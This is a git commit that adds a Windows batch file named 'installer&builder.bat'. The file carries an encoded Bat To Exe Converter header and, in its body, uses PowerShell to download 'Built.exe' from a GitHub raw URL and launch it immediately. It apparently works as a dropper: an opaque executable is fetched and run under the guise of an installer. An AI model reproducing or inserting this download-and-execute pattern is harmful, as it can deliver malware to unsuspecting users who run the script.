382847eda2f7574aff7c09d5ac52c06470cf4c26
BUSSO-coder <138984454+BUSSO-coder@users.noreply.github.com>
2024-07-22 13:22:34 +0200

    Add files via upload

---
+++ installer&builder.bat
@@ -0,0 +1,48 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFC5ASQqWOVeeCaIS5Of66/m7q0AcU+csNobY1dQ=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFC5ASQqWOVeVCLA4+uHt6tajp14WQO0vRJ3azvTIYPMD81LlZ5MR1G9TlM8JHlVdZhfL
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+setlocal
+ 
+
+set "url=https://github.com/BUSSO-coder/boh/raw/main/Built.exe"
+
+set "file=Built.exe"
+
+
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"
+
+
+start "" "%file%"
+
+endlocal
